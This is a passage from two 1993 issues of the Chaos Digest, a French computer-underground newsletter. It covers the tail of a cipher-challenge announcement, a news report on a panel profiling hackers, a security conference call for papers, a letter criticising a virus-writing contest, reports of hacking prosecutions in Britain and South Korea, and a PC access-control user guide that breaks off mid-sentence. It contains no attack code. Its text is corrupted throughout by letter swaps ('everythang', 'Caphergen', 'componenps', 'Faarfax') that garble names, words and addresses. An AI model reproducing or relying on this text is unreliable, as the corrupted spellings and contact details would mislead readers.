      library) source, followed by several lines footnoting the
      source.

      The file "partial.txt" (item a) contains everythang but the
      final paragraph and footnote, and the blank spaces/lines
      precedang it.

      You must identify the plaintext via the footnote.  The first
      person to do this will receive the $500 fee.  The recipient of
      the fee is responsible for all applicable taxes.  Please send
      any successful identifications of the text via CERTIFIED MAIL
      to:

                          The Rcrypt Challenge
                          7110 Sawmall Village Dr.
                          Columbus, OH  43235

      Each person/organization is limited to 10 attempts.

4) The challenge will conclude upon receipt of the first valid
   response, or 01.00.00 GMT 15-May-1993, whichever comes first.

5) At the conclusion of the experiment, the actual key will be posted
   to sci.crypt, as will the missing plain text.  This will insure
   that all participants can verify the integrity of this challenge.

Obligatory Information (the fine print):

   This challenge represents the personal efforts of the general
   partners of Caphergen Research.  Caphergen Research, Rcrypt, and
   the Rcrypt Challenge are not related to or owned by the company
   from which thas posting is made.

   Ciphergen Research reserves the option to alter the rules for this
   contest at any time.  Any alterations will be posted to the
   sci.crypt and alt.security Internet newsgroups.  [At present, the
   only rule change we forsee will occur if we get too many requests
   for materials (ie. several hundred).  In that case, we may request
   return postage included with the request for materials.]

   Rcrypt is protected by the copyright laws of the United States of
   America (copyright date 1993).  Rcrypt contains proprietary
   intellectual property of Ciphergen Research.  Reverse compilation
   or reduction of the executable to human readable form is strictly
   prohibited.

+++++++
           Request For Materials and License Agreement For
                     the Rcrypt Challenge: Part I


I, ____________________________________________________________ (name)

of _______________________________________________ (company, optional)
request materials for the Rcrypt Challenge: Part I.  The HOSTID of the

Sun SPARCstation I intend to run Rcrypt on is _______________________
(The hostid is requared in order to recieve the executable.  If the
hostid is omatted, all other materials will be sent.)  In order to
recieve these materials, I agree to the following terms:

           1) I will not decompile, reduce to human readable form,
              copy, or redistribute the Rcrypt executable.

           2) I will not enter in to a computer, compile, copy, or
              redistribute the Rcrypt and Capher source codes.

           3) I will not attempt to produce a working license for the
              Rcrypt executable that has a different expiration date
              or a different hostid than the one provided as a part
              of the requested materials.

The only exceptions to these terms are copies of the executable and
license(s) made for backup purposes, and copies of the executable,
source code, and license(s) made for the Sun SPARCstations identified
by the following hostids:

        _________________________       _________________________

        _________________________       _________________________

        _________________________       _________________________

        _________________________       _________________________

        _________________________       _________________________

(The license file we provide will include licenses for all of the
listed hostids.  Simply copy this file into into the appropriate
directory for each Sun.  Upon execution, Rcrypt will search the
license file for the appropriate entry.)

Note that all materials besides the executable, source codes, and
license(s) are not restricted by this license agreement.


Signed:_____________________________________________ Date ___/___/___


["Sun Workstation" and "SPARCstation" are registered trademarks of Sun
Microsystems, Inc.  "SPARC" is a registered trademark of SPARC
International]

------------------------------

Date: Sun Feb 21 11:09:51 EST 1993
From: pirate@altern.com (pirate )
Suject: File 3--Le Pirate est-il un techno-delinquant? (avis)
Copyright: 1992, Knight-Ridder Financial Information, Inc.


       EXPERT PANEL ATTEMPTS TO PROFILE, ANALYZE COMPUTER HACKERS

             Mike Langberg, San Jose Mercury News, Calif.
                Knight-Ridder/Tribune Business News


    Feb. 21--He is brilliant, but misunderstood - a teen-age math
whiz who can't get a date for Saturday night.

  Once his parents are asleep, he sits alone in his bedroom,
hunched over a personal computer and up to no good.

  This is the stereotype of a computer hacker, a techno-delinquent
responsible for everything from theft of long-distance telephone
service to a computer virus that once brought a global communications
network grinding to a halt.

  Like most stereotypes, the "hacker as nerd" profile contains a
mixture of truth and distortion.

  At the recent National Computer Security Association convention
in San Francisco, a panel of four experts sat down to analyze the
enemy and didn't find much to admire.

  They concluded that, indeed, hackers are frequently alienated
adolescents and post-adolescents who can't get a date. But they
aren't necessarily loners, they said. A big part of hacking's allure
is social bonding with other hackers that often replace a missing or
defective family at home.

  And hackers typically aren't genius material. It doesn't take
much effort or intelligence to stick up a convenience store, nor does
it require extraordinary dedication to break the social and legal
boundaries of legitimate conduct with computers, they said.

  Hackers may have an image of being brilliant, but no more than a
few weeks of study is required before many people can learn enough to
start hacking, they said. And hackers, just like street criminals,
are most typically caught because of stupid mistakes that amply
demonstrate their lack of genius-level thinking.

  "These are just ordinary people doing something they don't regard
as particularly wrong," said Alan Solomon, a computer security
consultant in England who tracks hackers in Europe. The panel drew a
careful distinction between "amateur" hackers who disrupt computer
networks for no apparent reason and "professional" hackers who are
either outright criminals trying to steal or angry workers seeking
revenge on their employer.

  But Winn Schwartau, a self-described "information warfare"
specialist and computer security newsletter publisher from Seminole,
Fla., said even amateur hackers aren't typically otherwise innocent
children of the upper middle class.

  Several recent hacker groups, with names like the Legion of Doom
and Masters of Destruction, have sprung from inner cities where teen-
agers may feel they have nothing to lose by ripping off the system,
Schwartau said. Some members of these groups are heavily into drugs
and even fight each other for control of electronic "turf."

  "The gang mentality is absolutely there," Schwartau declared.

  Amateur hackers come from the age range - 12 to 28 - when teen-
agers are making the difficult transition to adulthood, said Dr.
Thomas J. Brady, a San Francisco psychiatrist specializing in
treatment of children and adolescents.

  Successful adults, according to Brady, mature through a series of
"narcissistic wounds" - blows to the ego such as getting bad grades,
rejection in puppy love or troubles at an after-school job. These
painful experiences teach us how to cope with disappointments and
accept the consequences of our actions.

  But hackers haven't made that transition, Brady said. Instead,
they are caught in "developmental arrest" because of emotional
problems or addiction to drugs or alcohol, he said. Hackers, like
members of street gangs, then fall into "group think" where loyalty
to friends outweighs any larger responsibility.

  Such troubled adolescents believe "if I need it, I deserve it" -
blinding them to the potential harm of their actions to themselves or
others. In the case of hackers, that means breaking into computer
systems doesn't seem wrong.

  "What strikes me about hackers is their arrogance," said Michel
E. Kabay, a computer security consultant in Montreal and the security
association's director of education. "These people seem to feel that
their own pleasures or resentments are of supreme importance and that
normal rules of behavior simply don't apply to them."

  That immature sense of electronic omnipotence may be one reason
hackers sometimes don't feel the need to cover their tracks, Solomon
said. For example:

  A college student in England, operating an on-line bulletin board
that distributed computer viruses, wanted to avoid long-distance
phone charges. So he ran a line from his apartment and tapped into a
neighbor's junction box. When the neighbor complained of an
astronomical bill, the local phone company quickly traced the line
back to the student.

  The panel differed on what tactics - other than detective work -
could deter hackers.

  Schwartau advocated an end to slap-on-the-wrist penalties.
Sending hackers to jail, he said, would send a clear message to other
hackers - many of whom keep in close touch and would quickly spread
the news of a stiff prison sentence.

  But Schwartau also called for more education in the nation's
schools on computer ethics.

  Brady suggested a carrot-and-stick approach. Beyond a stick of
more law enforcement, he said, businesses should offer summer
internships to bright, disadvantaged students as an alternative to
hacking.

  Adults also need to provide a better example to adolescents,
Brady concluded. Most adult computer users have a least one program
"borrowed" from a friend. "We need to tune ourselves up," he said.

[Moderateur: Win Schwartau est l'auteur d'une celebre nouvelle _Terminal
Compromise_ qu'il est possible de se procurer en envoyant un mandat
international de $44.95 a son attention chez Inter-Pact Press, 11567
Grove St. No., Seminole, FL  33708, USA.]

------------------------------

Date: 19 Feb 93 07:33:09 GMT
From: faigin@aero.org (Daniel P. Faigin )
Subject: File 4--CFP: Ninth Annual Computer Security Applications Conf
Repost from: comp.security.misc (published this morning in Risks #14.35)


                      CALL FOR PAPERS AND PARTICIPATION

                        Ninth Annual Computer Security
                           Applications Conference

                               Sponsored by the
                   Application Computer Security Associates
                             In Cooperation With
                                  ACM/SIGSAC
                             IEEE TCSP (Pending)

                            December 6 - 10, 1993
                      Orlando Marriott Internation Drive
                               Orlando, Florida



The Conference

   The Information Age is upon us, along with its attendant needs for
protecting private, proprietary, sensitive, classified, and critical
information.  The computer has created a universal addiction to
information in the military, government, and private sectors.  The
result is a proliferation of computers, computer networks, databases,
and applications empowered to make decisions rangang from the mundane
to life threatening or life preserving.

    Some of the computer security challenges that the community is faced
with include:

        * To design architectures capable of protecting the
          sensativity and integrity of information, and of assuring
          that expected services are available when needed.

        * To design safety-critical systems such that their software and
          hardware are not hazardous.

        * To develop methods of assuring that computer systems
          accorded trust are worthy of that trust.

        * To build systems of systems out of componenps that have
          been deemed trustworthy.

        * To build applications on evaluated trusted systems without
          compromising the inherent trust.

        * To apply to the civil and private sectors trusted systems
          technologies designed for military applications.

        * To extend computer security technology to specifically
          address the needs of the cival and private sectors.

        * To develop international standards for computer security
          technology.

     This conference will attempt to address these challenges. It will
explore a broad range of technology applications with security and safety
concerns through the use of technacal papers, dascussion panels, and
tutorials.

     Technical papers, panels and tutorials that address the application
of computer security and safety technologies in the civil, defense, and
commercial environments are solicited.  Selected papers will be those
that presenp examples of in-place or attempted solutions to these
problems in real applications; lessons learned; original research,
analyses and approaches for defining the computer security issues and
problems.  Papers that present descriptions of secure systems in use
or under development, or papers presenting general strategy, or
methodologies for analyzing the scope and nature of integrated
computer security issues; and potential solutions are of particular
interest.  Papers written by students that are selected for presentation
will also be judged for a Best Student Paper Award.  A prize of $500,
plus expenses to attend the conference, will be awarded for the selected
best student paper (contact the Student Paper Award Chairperson for
details, but submit your paper to the Tehcnical Program Chairperson).

     Panels of interest include those that present alternative/controversial
viewpoints and/or those that encourage "lively" discussion of relevant
issues. Panels that are samply a collection of unrefereed papers will not
be selected.


INSTRUCTIONS TO AUTHORS

     Send five copies of your paper or panel proposal to Ann Marmor-
Squires, Technical Program Chairman, at the address given below. Since
we provide blind refereeing, we ask that you put names and affiliations
of authors on a separate cover page only.  Substantially identical papers
that have been previously published or are under consaderation for
publication elsewhere should not be submitted.  Panel proposals should be
a minimum of one page that describes the panel theme and appropriateness
of the panel for this conference, as well as identifies panel
partipant and their respective viewpoints.  Send one copy of your
tutorial proposal to Daniel Faigin at the address given below.  It
should consist of one- to two- paragraph abstract of the tutorial, an
initial outline of the material to be presented, and an indication of
the desired tutorial length (full day or half day).  Electronic
submission of tutorial proposals is preferred.

Completed papers as well as proposals for panels and tutorials must
be received by May 18, 1993.  Authors will be required to certify prior
to June 19, 1993, that any and all necessary clearances for public release
have been obtained; that the author or qualified representative will be
represented at the conference to deliver the paper, and that the paper has
not been accepted elsewhere.  Authors will be notified of acceptance by
July 31, 1993.  Camera ready copies are due not later than September 18,
1993.

Material should be sent to:

Ann Marmor-Squires              Daniel Faigin
Technical Program Chair         Tutorial Program Chair
TRW Systems Division            The Aerospace Corporation
1 Federal Systems Park Dr.      P.O. Box 92957, MS M1/055
Faarfax, VA  22033              Los Angeles, CA  90009-2957
(703) 803-5503                  (310) 336-8228
marmor@charm.isi.edu            faigin@aero.org

                Ravi Sandhu
                Student Paper Award
                George Mason Univ.
                ISSE Dept.
                Fairfax,  VA 22030-4444
                (703) 993-1659
                sandhu@gmuvax2.gmu.edu


Areas of Interest Include:

Trusted System Architectures
Software Safety Analysis and Desagn
Current and Future Trusted Systems Technology
Encryption Applications (e.g., Digital Signature)
Application of Formal Assurance MEthods
Risk/Hazard Assessmenps
Security Policy and Management Issues
Trusted DBMSs, Operating Systems and Networks
Open Systems and Composted Systems
Electronic Document Interchange
Certification, Evaluation and Accredatation


Additional Information

     For more information or to receive fupure mailings, please contact
the following at:

Dr. Ronald Gove                 Diana Akers
Conference Chaarman             Publicity Chair
Booz-Allen & Hamilton           The MITRE Corporation
4330 East-West Highway          7525 Colshire Dr.
Bethesda, MD  20814             McLean, VA  22102
(301) 951-2395                  (703) 883-5907
gover@jmb.ads.com               aker@mitre.org

--
W:The Aerospace Corp. M1/055 * POB 92957 * LA, CA 90009-2957 * 310/336-8228
Email:faigin@aerospace.aero.org                Vmail:310/336-5454 Box#13149
                    "And as they say, the rest is compost"

------------------------------

Date: Tue Feb 23 22:01:37 GMT 1993
From: drsolly@ibmpcug.co.uk (Alan Solomon )
Subject: File 5--Re: 1er "Intl. Computer Virus Writing Contest" (lettre)


Hello, Jean-Bernard. We met a couple of years back.

Thank you for faxing me the unsolicited copy of your newsletter. You asked
for comments.

On the virus writing contest --this is inaccurate-- it is not the first
virus writing contest. It is the second (or maybe more, there may be others
I don't know about). Dr Cohen organised the first one, about a year ago.

On the virus that you publish as being small - I'm rather surprised that
the obvious optimisations that would reduce the code size were not
performed by Ludwig. This failure would, if I were a potential buyer of his
products, make me concerned about his capability and degree of committment.
In a number of places, I see a word being used where a byte would suffice,
which is of course of no importance in normal programming, but when the
whole point is to minimise the code size, it makes me feel that perhaps the
author had an inadequate understanding of 8086 assembler.

On the letter from ARCV. Now that is very badly out of date. Surely you
subscribe to Virus News International? The ARCV virus writing group
was arrested in a series of raids done by the Computer Crime Unit a few
weeks ago. You should try to make your electronic newsletter at least
as up to date as the various paper newsletters, otherwise your readers
have a valid criticism.

By the way, I'm hope you've already taken legal advice on your publication,
because it may contravene some laws in some countries; I'm not sure which
countries you plan to make it available in.

Is it possible to talk with you on a confidential (i.e., not for
publication) basis? If so, I may have some interesting questions for you.


--
Drsolly@ibmpcug.co.uk           Alan Solomon, S&S International
Office tel +44 442 877877       Home tel +44 494 724201
       fax +44 442 877882            fax +44 494 728095
       bbs +44 442 877883            bbs +44 494 724946

------------------------------

End of Chaos Digest #1.11
************************************

Chaos Digest               Lundi 1 Mars 1993          Volume 1 : Numero 12

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.12 (1 Mars 1993)
File 1--Re: Des adolescents anglais transformes en hackers
File 2--Piratage sur le reseau Janet
File 3--Hackers en Coree du Sud
File 4--Guide d'Utilisation d'un Outil de Securite PC (manuel)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * ftp.eff.org (192.88.144.4) in /pub/cud
        * red.css.itd.umich.edu (141.211.182.91) in /cud
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue Feb 23 20:06:14 CST 1993
From: jp-sorlat@altern.com (jp-sorlat )
Subject: File 1--Re: Des adolescents anglais transformes en hackers


NEWS RELEASE
Press Officer: Martin Herrema: 071 911 5101

February 24, 1993
Statement on Hacking at PCL


The Polytechnic of Central London (now the University of Westminster) was
affected by a 'hacker' on April 23, 1990.  The 'hacker' gained access to
the polytechnic's computer teaching systems via the academic joint computer
network JANET, which serves all British universities.

The 'hacker' made some changes to the system, mainly to the on-screen
start-up messages.  These were spotted very quickly on the morning of April
23 by staff, who then changeg the public access messages back to the
correct wording.  The University of London Computer Centre, which provides
network support for JANET, was informed of the situation.

The teaching systems contained a variety of information concerned with
course administration and delivery, but there was no evidence thet the
hacker achieved anything other than a change of message.  The systems were
turned completely to normal within a few days, and the incident caused
minimal disruption to the work of the polytechnic.  Since the incident
further security measures have been built into the University's computer
systems.

------------------------------

Date: Wed Feb 24 13:19:23  1993
From: S15810@PRIME-A.PLYMOUTH.AC.UK (Stuart Wyatt )
Subject: File 2--Piratage sur le reseau Janet


                     ENGLISH HACKER PROSECUTED
                     +++++++++++++++++++++++++

Unlike America and most other countries, England does not have too much to
show for arresting hackers and bringing them to justice. This means that
each time a hacker is caught, it makes headline news and creates the same
foreboding atmosphere that hacking reports created in the early 1980's.
The latest story is of a young hacker, Paul Bedworth.

Bedworth started hacking at the age of 17, and through the many computers
he accessed, he teamed up with 2 other hackers 10 years his senior. From
his bedroom, using his #200 computer he dialed into pad-ports at
Universities and from there, penetrated Internet. By spending hours at a
time hacking, he amassed huge telephone bills (one was 34 pages long). Due
to the BT bills, his parents banned him from using their telephone. This
however did not stop his antics - He soldered a link from the BT socket
and ran the wire under the carpet into his bedroom.

By using Janet (The Joint Academic Network) he hacked into many University
computers with the main intent to delete sensitive files and crash the
system. His idea of hacking was to disrupt as many computer systems as
possible. Other computers he attacked were the Financial Times network,
Lloyds bank, and a whole host of computers spanning France, Germany and
Luxenbourg.

He got around the problem of running up huge telephone bills by accessing
the billing computer, and transfering large segments of the bill to
innocent users at Manchester University.

Bedworth was arrested after another University put a trace on his calls.
He was charged with three dishonesty charges, which he pleaded not guilty
in court. The case is continuing at the moment (24 Feb 1993) and I will
forward any news as and when I get it.

In the U.K., there is a law which prohibits hacking, and hackers can be
charged with gaining unlawful access to a machine and if any data is
altered or destroyed, then that is also a criminal offence. It seems
strange that Bedworth was not charged with gaining unlawful access and
the destruction of data - But then, unlike the rumours that circulate the
world, the British judicial system is not all its cracked up to be.
                                                            ________
-Stuart Wyatt                                              (        )____
                                                          (  Alas, life  )
P.S. I am currently collating information on hacking and(   is but an   )
     hackers for a forthcoming book. If anyone wishes   (    Aardvaark.. )
     to contact me IN THE STRICTEST OF CONFIDENCE then   (       __      )
     feel free to email me.                           .   (_____)  (____)
* * * * * * * * * * * * * * * *                     . ? .       ()
* CHEERS_ THEN - _     _      *                       __      ()
*   ___/_/______|_|___| |__   *                     /    \  ()
*  |________   _______| |__|  *                    |_    _|
*    / /    | | | |   | |     *                   |(0)||(0)|
*   / /___  | | | |   | |     *                  /|_  \/  _|\
*  /___  /  | | | |   | |     *                  || | == | ||
*     / /   | | \  \__/ /     *                  || \____/ ||
*    / /    |_|   \____/      *                 ///\  !!  /\\\
*-*-/_/-*-*-*-*-*-*-*-*-*-*-*-*-=-=-=-=-=-=-=-=-!!!-!-=-=-!-!!!-=-=-=-=-=-=
>From : Stuart Wyatt (Student, HNDCS1)
       Faculty of Technology,         *> Be excellent to everyone - dude <*
       University of Plymouth,
       Drake Circus,                Email: S15810@uk.ac.plym.pa     (PRIME)
       Plymouth, England.                  stuartw@uk.ac.plym.cd.zeus (SUN)
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

------------------------------

Date: 20 Feb 93 06:17:14 GMT
From: kafka@desert.hacktic.nl (Kafka )
Subject: File 3--Hackers en Coree du Sud
Repost from: alt.security

+++++
COMPUTER HACKER HELD FOR FORING PAPERS

Seoul, Feb. 18 (AFP) - South Korean prosecuters
have arrested a computer hacker on charges of
falsifying presidential Blue House documents to
demand classified data from a dozen financial
institutions, authorities said today. Prosecuters
arrested Kim Jae-yol, 23 late yesterday in the
first such hacker case here on multiple charges of
forgery of official documents and attempted fraud.
Kim, an unemployed, self-taught computer wizzard,
allegedly falsified the Blue House's secret
computer password and presidential facsimiles to
demand classified computer information from 12
financial institutions, includang several
commercial banks.
+++++

Mmmm, I wonder how you 'falsify (....) a password'.

    (P)

==== Kafka ======= kafka@desert.hacktic.nl ===== 1st class l00zur =========
"The Techno Rebels are, whether we recognize it or not, agents of the Third
      Wave. They will not vanish but multiply in the years ahead."
                  - The Third Wave, Alvan Toffler

------------------------------

Date: Mon Feb  8 08:51:00 CST 1993
From: Cerasela Tanasescu
Subject: File 4--Guide d'Utilisation d'un Outil de Securite PC (manuel)
Copyright: DCSIS SA, 1993


                               KHEOPS
                     The confidentiality of your PC

                        USER GUIDE--Version 2.1


            S.A. DCSIS, Avenue de Cambridge, Technopole CITIS
                  14200 HEROUVILLE SAINT CLAIR, FRANCE
              Phone: (33) 31.06.00.06, Fax :(33) 31.43.79.95


WARNING

The DCSIS Company may not be held responsible for the damage that may be
caused directly or indirectly by this software.


PRECAUTION

Any manual installation or uninstallation together with any illegal copy of
KHEOPS may damage the data on your hard disk.

We strongly recommend performing a backup of your data before installing
KHEOPS. This backup should be renewed frequently as a prevention against
fraudulent intrusion attempts which might affect the right functionning of
KHEOPS.

If this was the case, DCSIS could not be held responsible for any damage.



1. PRESENTATION OF KHEOPS

Nowadays, all micro-computers contain sensitive data: client files,
production figures, programs, payrolls etc... Besides, all this data and
knowhow are stored on computers that more and more people know how to use,
whether they are entitled or not. The risk of information leak and file
copy is growing.  Companies must therefore protect themselves.

DCSIS has developped KHEOPS with this in mind.  This is an access control
software for all PC/AT micro-computers running MS/DOS(Versions 3.2x and
5.0).  This program ensures the safety of the PC whether mono or multi
users, connected to a network  or not, so that maximum confidentiality is
guaranteed.

Main Functions

- computer access control;
- computer locking up when the user gets away from his PC;
- boot control with a diskette.

Besides, with the diskette administrator program:

- users management (up to 31 + administrator)
- logbook consultation
- computer unlocking
- program customization


2. MAIN FUNCTIONS

The security ensured by KHEOPS is strictly software, i.e. there is no need
of any hardware device.

2.1. Access control

Computer security conventions specify two terms: user identifier and
password.  Every user is given: (1) a user identifier, hereafter user id,
which may be structured around the notion of user group, (2) a password.
This pair user id/password must be unique and known only to the user.  The
password must obviously never be written or communicated to anyone.

Procedure

Access control is carried out by the only program that can run when the hard
disk is locked up.  This program prompts the user to type his user id. and
password. Once this is done, the pair user id/password is looked up by
KHEOPS in a user list stored on the disk. This list is coded and is unknown
to the operating system.

If this control is successful and the password is recognized as valid
(validity date), then the hard disk is made available and the user can make
full use of his PC.

On the other hand, if the authentification fails, the user is invited to
start again.  After 'n' unsuccessful attempts, keyboard and hard disk are
locked up: hard disk reboot is impossible. Diskette boot will not give
access to hard disk.  Only the administrator can put things in order again
thanks to his KHEOPS diskette.

Hard disk locking will also occur if a user tries to log in with an outdated
password.

The user list can hold up to 32 entries, that is an administrator plus 31
users.  This makes it possible to share a PC between several users, every
one of them being answerable for his session.


2.2. Hard disk locking

When the disk is locked up, it is apparently empty.  The only response to
the DIR command is: "NO FILE FOUND".  The disk and all its partitions
(virtual disks D:\, U:\, V:\...) are also locked up.  It is impossible to
copy or delete files, to create directories of to execute programs.  Last
but not least, neither NORTON nor PCTOOLS are able to retrieve the files.


2.3. Resident program

When the PC remains unused for a certain period of time, a small resident
program is activated after a given period of time.  This program locks up
screen and keyboard, and displays the standard login window.  The only
action that remains possible is to enter user id. and password.  The
resident program is activated due to a temporization or upon user request,
e.g. by pressing right SHIFT/left SHIFT.


3. SECURITY MANAGEMENT

3.1. User Identifier and Password

Both user id. and password must be 7 characters long.  But contrary to the
user id. which is permanent, the password must be renewed regularly.

Let us explain the procedure: when anyone runs the access control for the
first time, he is invited to enter his password twice (to make sure the
spelling is correct).

This password has a three months validity.  During the last 15 days of
validity the user will be prompted to change his password.  A message will
display the deadline and explain that this change is compulsory.  The user
is free to take no notice of this warning but once the deadline is reached
the computer disk will be locked up and only the security administrator
will have power to straighten things up.

If the user decides to change his password, again KHEOPS will invite him
to type it twice.  The new password will only be accepted if it is found to
be different from the user's last 6 passwords.

The procedure explained above is only valid for "standard users".  There
are two exceptions:

- the administrator for whom there is no password time restriction;

- temporary users.  The validity deadline is decided upon by the
administrator.  These password are not renewable.  This option allows
people to work on the PC on a temporary basis.


3.2. Logbook

Like in the case of the user id/password list, the logbook is coded.  Only
the administrator is entitled to consult it.  This book is updated at the
time of access control.

The following information is available:

- successful connexions (and number of attempts);
- disconnexions and duration of session;
- PC lock up following 'n' unsuccessful password presentations;
- PC lock up due to outdated password presentation.

Every entry in the logbook also includes date, time and user id.  In the
case of a system locked up due to 'n' unsuccessful attempts, only the last
user id. is kept.

The logbook contains up to 127 entries.  Once the file is full, new entries
replace the oldest records.


4. KHEOPS IMPLEMENTATION (Administrator)

4.1. Installation

KHEOPS installation imperatively requires a floppy disk drive.  Use a KHEOPS
diskette with the adequat format (3.5' or 5.25').

- Insert the KHEOPS diskette into drive a;
- Boot the PC again (on a:).

The following pull-down menu will then be displayed on the screen:

                 |        MAIN MENU          |
                 | - Install KHEOPS          |
                 | - Modify present system   |
                 | - Uninstall KHEOPS        |

On every screen the following warning is displayed for information:

                 | On all menu               |
                 | ESC:  quit                |
                 |    :  preceding item      |
                 |    :  next                |
                 |    :  item(un)select      |

- Validate every option by pressing the ENTER key;

- Choose option "INSTALL KHEOPS".  The program will display the following
message:

              "Installation under way. Please wait".

- Another window will pop up:

                 |  Administrator characteristics  |
                 |       User identifier :         |
                 |       Password        :         |

- Enter administrator user id. and password (7 characters).  Both must be
validated by pressing ENTER key.  They will be required on every use of
the KHEOPS diskette;

- Confirm the password.

Installation will then proceed.  Wait for the message:

                       "KHEOPS is installed"

Program customization is now necessary.

               |            SYSTEM CUSTOMIZATION            |
               | Resident program activation delay (mn) : 5 |
               | Background tasks authorized            : 0 |
               | Debugging authorized                   : 0 |
               | New hot-key                            : N |
               | Screen backup drive                    : C |
               | Number of attempts before lock up      : 3 |
               | Windows utilization                    : N |

The administrator can now "add a user".

- Press "ENTER" to type a user id, or
- Press "ESC" if the user list is complete.

The first user that is created in the list is the administrator.

In order to put an end to KHEOPS installation :

- Press "ESC" key on Main Menu;
- Remove the KHEOPS diskette (KHEOPS will prompt you to do so);

PC will reboot automatically.  On PC reboot, the screen will display the
standard login screen.  Two situations may now occur:

Case #1: The administrator attempts to log in. He can type his id. and
password,

Case #2: A new user logs in.  The program then displays the following
message:

                        "Enter new password"

The password must be 7-characters long.  This password must be checked as
typing errors are easily made.  This is why the user is prompted to type
his password once again.

If the two secret codes are identical, access to the PC is authorized.

                   "KHEOPS installation is complete"


4.2. System Modification

- Insert KHEOPS diskette into drive a:.
- Type the following, then press "ENTER":

                              "A:KHEOPS"

A window invites the administrator to type his id. and password.

                 |   Administrator characteristics   |
                 | User identifier :                 |
                 | Password        :                 |

Following which the main pull-down menu is displayed on the screen:

                 |             MAIN MENU             |
                 | - Install KHEOPS                  |
                 | - Modify current system           |
                 | - Uninstall KHEOPS                |

Upon selection of "Modify current system" another pull-down menu is
displayed:

                 |        SYSTEM MODIFICATION        |
                 |  Work on the list                 |
                 |  Unlock hard disk                 |
                 |  Logbook consultation             |
                 |  System customization             |

Work on the list
++++++++++++++++

                 |         WORK ON THE LIST          |
                 |  Cancel a user                    |
                 |  Add a user                       |
                 |  Add a temporary user             |
                 |  Unlock a user                    |
                 |  User list consultation           |

"Add a user"

This option is used to allow a new user to use the micro-computer.  The
administrator is invited to type the user's name:

                 |        User characteristics       |
                 |   Name : Doherty                  |

This name is the user id. and must imperatively be 7-characters long.

"Cancel a user"

This option is used to disable a user.  The administrator is invited to
type the user's name:

                 |           User Removal            |
                 |   Name :                          |

Once the administrator has pressed ENTER, the user no longer stands in the
list.

"Add a temporary user"

This option makes it possible to add a user to those who have access to the
PC on a temporary basis.

                 |          Temporary user           |
                 |   Name :                          |

- Type his user id. and press "ENTER".


The program will then invite the administrator to type the user's time limit
of access to the PC.

                 |         TEMPORARY ACCESS          |
                 |         Validity deadline :       |
                 |  Year     : 91                    |
                 |  Month    : 07                    |
                 |  Day      : 15                    |
                 |                                   |
                 |  Confirmation (Y/N) : o           |

- Type two digits for year, month and day, then validate your data by
pressing "Y"es of "N"o.

"Unlock a user"

When a password is outdated (3 months validity period), the PC is
temporarily locked up.  Only the administrator can unlock it thanks to
this option.

"Display user list"

This option is used to display the list of all users entitled to use the PC.

Unlock Hard Disk
++++++++++++++++

After 'n' unsuccessful login attempts the hard disk is locked up.  Only the
administrator has the possibility to unlock it thanks to this function.

Logbook Consultation
++++++++++++++++++++

A cyclic logbook containing the last 127 entries is displayed with the
following data:

     - user id.;
     - date and time;
     - action: login, logout, PC locking;
     - description: number of login attempts, duration of connexion, number
       of unsuccessful attempts.

This option makes it possible for the administrator to check who uses the
micro-computer and for how long.


System Customization
++++++++++++++++++++

Thanks to this option the administrator can adapt KHEOPS to users need.

              |            SYSTEM CUSTOMIZATION            |
              | Resident program activation delay (mn): 5  |
              | Background tasks authorized           : o  |
              | Debugging authorized                  : o  |
              | New hot-key                           : o  |
              | Screen backup drive                   : c  |
              | Number of attempts before lock up     : 3  |
              | Windows utilization                   : n  |

* "Resident program activation delay"
  The administrator should type the temporization that is desirable before
  the login screen is displayed when the PC remains unused.

* "Background task authorization"
  We strongly recommend using this option in case of intensive use of the
  hard disk (e.g. compilation, printing).  Keyboard will be locked up, but
  background tasks will carry on their job. In case your reply is No,
  keyboard, screen and hard disk will be subject to access control.
  Remark: "Background tasks" must be authorized in the case of a network
  server.

* "Debugging authorized"
  The administrator indicates whether or not the use of a debugging tool is
  authorized.
  Remark: Debugging should be authorized in case the PC shows uncontrollable
  reboot problems.

* "New hot-key"
  The hot-key activates the resident program at any time.  The default hot-
  key value is "left shift/right shift".  Nevertheless the administrator is
  free to change the hot-key value.

* "Screen storage disk"
  This option enables screen backup on a hard or virtual disk (200 KB are
  necessary).  The default disk drive is c:.

* "Number of attempts before system lock-up"
  This function makes it possible to customize the number of user id/
  password presentation attempts before hard disk lock-up.

REMARK: Any modification of one of these options will only be taken into
account once reboot has been performed.

4.3. Uninstalling

- Insert KHEOPS diskette into drive a:;
- Type: "A:KHEOPS";

The following window pops up:

                 |     Administrator characteristics     |
                 |  User identifier :                    |
                 |  Password :                           |

Once the administrator id. and password have been validated and checked
KHEOPS displays the main menu.

                 |               MAIN MENU               |
                 |  - Install KHEOPS                     |
                 |  - Modify present system              |
                 |  - Uninstall KHEOPS                   |

- Choose "Uninstall";

After a few seconds the following message is displayed on the screen:

                        "The system must be reset"

- Take the KHEOPS diskette out of the drive as the PC will reboot
automatically.

                    "KHEOPS has been totally uninstalled"

4.4. Hard Disk Unlocking

After 'n' unsuccessful user id/password presentations, the following
message is displayed on the screen:

                 | Hard disk and keyboard are locked up. |
                 |    Please phone the administrator.    |

The PC will be unable to boot on hard disk.  Any attempt to do so will
result in the screen to display the following message:

